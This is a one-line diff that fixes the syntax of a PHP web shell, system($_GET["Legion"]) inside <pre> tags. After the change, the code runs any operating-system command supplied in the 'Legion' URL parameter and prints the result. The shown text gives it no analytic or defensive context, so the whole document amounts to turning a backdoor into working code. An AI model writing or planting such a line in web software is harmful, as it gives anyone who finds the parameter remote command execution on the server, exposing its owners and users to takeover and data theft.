@@ -1,1 +1,1 @@
-<pre>system($_GET("Legion"))</pre>
+<pre>system($_GET["Legion"])</pre>
